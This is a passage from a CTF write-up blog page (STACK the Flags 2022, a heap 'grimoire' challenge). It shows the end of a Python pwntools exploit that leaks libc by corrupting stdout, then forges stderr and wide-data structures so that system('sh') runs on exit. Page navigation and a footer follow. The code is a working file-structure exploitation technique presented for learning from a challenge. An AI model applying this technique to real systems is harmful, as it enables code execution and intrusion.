</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite stdout-&gt;_flags to 0x1800</span>
</span></span><span style="display:flex;"><span>flags_offset <span style="color:#555">=</span> <span style="color:#f60">0x0</span>  <span style="color:#09f;font-style:italic"># stdout-&gt;_flags  = &amp;stdout + 0x0</span>
</span></span><span style="display:flex;"><span>flags <span style="color:#555">=</span> p32(<span style="color:#f60">0x1800</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#366">len</span>(flags)):
</span></span><span style="display:flex;"><span>    edit(r, stdout_offset_from_chunk<span style="color:#555">+</span>flags_offset<span style="color:#555">+</span>i, flags[i])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite stdout-&gt;_IO_write_ptr to be larger than</span>
</span></span><span style="display:flex;"><span>write_ptr_offset <span style="color:#555">=</span> <span style="color:#f60">0x28</span> <span style="color:#09f;font-style:italic"># stdout-&gt;_IO_write_ptr = &amp;stdout + 0x28</span>
</span></span><span style="display:flex;"><span>write_ptr_lsb    <span style="color:#555">=</span> <span style="color:#f60">0x50</span> <span style="color:#09f;font-style:italic"># You can choose any value. I choose 0x50</span>
</span></span><span style="display:flex;"><span>edit(r, stdout_offset_from_chunk<span style="color:#555">+</span>write_ptr_offset, write_ptr_lsb)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now, when the binary called menu() (which will call puts())</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># It will leak a libc address, which equivalents to _IO_stdfile_1_lock</span>
</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> r<span style="color:#555">.</span>recv(<span style="color:#f60">16</span>)[<span style="color:#f60">5</span>:]
</span></span><span style="display:flex;"><span>leaked_libc <span style="color:#555">=</span> u64(out[:<span style="color:#f60">8</span>])
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked libc  : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leaked_libc)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> leaked_libc<span style="color:#555">-</span>libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;_IO_stdfile_1_lock&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Libc base    : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> libc_base
</span></span><span style="display:flex;"><span>chunk_addr <span style="color:#555">=</span> libc_base <span style="color:#555">-</span> <span style="color:#f60">0xf7ff0</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Chunk addr   : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(chunk_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Getting RIP Control via exit through stderr
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Setup fake _wide_vtable</span>
</span></span><span style="display:flex;"><span>fake_wide_vtable_addr                         <span style="color:#555">=</span> chunk_addr <span style="color:#555">+</span> <span style="color:#f60">0x100</span>
</span></span><span style="display:flex;"><span>fake_wide_vtable_doallocate_offset_from_chunk <span style="color:#555">=</span> (fake_wide_vtable_addr <span style="color:#555">-</span> chunk_addr) <span style="color:#555">+</span> <span style="color:#f60">0x68</span>
</span></span><span style="display:flex;"><span>system_addr                                   <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(p64(system_addr)):
</span></span><span style="display:flex;"><span>    edit(r, fake_wide_vtable_doallocate_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Setup fake _wide_data</span>
</span></span><span style="display:flex;"><span>fake_wide_data_addr                            <span style="color:#555">=</span> chunk_addr
</span></span><span style="display:flex;"><span>fake_wide_data_IO_write_base_offset_from_chunk <span style="color:#555">=</span> (fake_wide_data_addr <span style="color:#555">-</span> chunk_addr)<span style="color:#555">+</span><span style="color:#f60">0x20</span>
</span></span><span style="display:flex;"><span>fake_wide_data_IO_buf_base_offset_from_chunk   <span style="color:#555">=</span> (fake_wide_data_addr <span style="color:#555">-</span> chunk_addr)<span style="color:#555">+</span><span style="color:#f60">0x38</span>
</span></span><span style="display:flex;"><span>fake_wide_data_wide_vtable_offset_from_chunk   <span style="color:#555">=</span> (fake_wide_data_addr <span style="color:#555">-</span> chunk_addr)<span style="color:#555">+</span><span style="color:#f60">0xe0</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(p64(<span style="color:#f60">0</span>)): <span style="color:#09f;font-style:italic"># Set _wide_data-&gt;_IO_write_base_offset to 0</span>
</span></span><span style="display:flex;"><span>    edit(r, fake_wide_data_IO_write_base_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(p64(<span style="color:#f60">0</span>)): <span style="color:#09f;font-style:italic"># Set _wide_data-&gt;_IO_buf_base_offset to 0</span>
</span></span><span style="display:flex;"><span>    edit(r, fake_wide_data_IO_buf_base_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(p64(fake_wide_vtable_addr)): <span style="color:#09f;font-style:italic"># Set _wide_data-&gt;_wide_vtable to fake_wide_vtable_addr</span>
</span></span><span style="display:flex;"><span>    edit(r, fake_wide_data_wide_vtable_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Forge stderr</span>
</span></span><span style="display:flex;"><span>fake_stderr                <span style="color:#555">=</span> FileStructure(<span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>flags          <span style="color:#555">=</span> u64(<span style="color:#c30">b</span><span style="color:#c30">&#39;  sh</span><span style="color:#c30;font-weight:bold">\x00\x00\x00\x00</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>_IO_write_base <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>_IO_write_ptr  <span style="color:#555">=</span> <span style="color:#f60">1</span> <span style="color:#09f;font-style:italic"># _IO_write_ptr &gt; _IO_write_base</span>
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>_wide_data     <span style="color:#555">=</span> fake_wide_data_addr
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>vtable         <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;_IO_wfile_jumps&#39;</span>]
</span></span><span style="display:flex;"><span>fake_stderr_bytes <span style="color:#555">=</span> <span style="color:#366">bytes</span>(fake_stderr)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(fake_stderr_bytes):
</span></span><span style="display:flex;"><span>    edit(r, stderr_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Exit and profit :D</span>
</span></span><span style="display:flex;"><span>exit_binary(r)
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">Twitter</a></p>

      </div>
      
        
  <aside class="toc-container">
    <a href="#" style="font-weight: 700; color: black;">STACK the Flags CTF 2022</a>
    <div class="js-toc">
      <details>
          <summary>Table of Contents
          </summary>
          <div>
              <nav id="TableOfContents">
  <ul>
    <li><a href="#initial-analysis">Initial Analysis</a>
      <ul>
        <li><a href="#main">main</a></li>
        <li><a href="#menu">menu</a></li>
        <li><a href="#create_grimoire">create_grimoire</a></li>
        <li><a href="#edit_grimoire">edit_grimoire</a></li>
      </ul>
    </li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#leveraging-the-oob-bug-with-malloc-behavior">Leveraging the OOB bug with <code>malloc</code> behavior</a></li>
        <li><a href="#getting-a-libc-leak">Getting a libc leak</a></li>
        <li><a href="#gaining-remote-code-execution-rce">Gaining Remote Code Execution (RCE)</a></li>
      </ul>
    </li>
  </ul>
</nav>
          </div>
      </details>
    </div>
  </aside>


      
    </div>

    
        <div class="tags">
            
                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
            
                <a href="https://chovid99.github.io/tags/stack-the-flags">STACK the Flags</a>
            
                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
            
                <a href="https://chovid99.github.io/tags/heap">heap</a>
            
                <a href="https://chovid99.github.io/tags/file">FILE</a>
            
        </div>
    
    
    
  <div id="comment">
    
    
  </div>


</section>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="/js/tocbot.min.js"></script>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.js-toc',
      
      contentSelector: '.js-toc-content',
      headingSelector: 'h1, h2, h3',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
  function initTOC() {
    var windowWidth = 1316;
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
  }
  window.onload = initTOC;

  var lastWindowWidth = $(window).width();
  $(window).resize(function() {
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
    lastWindowWidth = $(window).width();
  });
</script>

    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
	 xml:space="preserve">
<g>
	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
</g>
</svg>

    </a>


</div>

    

    <div class="copyright">
    
       © Copyright 
       2022 
       <span class="split">
        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
</svg>
       </span>
       Chovid99
    
    </div>

    
</footer>



  </body>
</html>
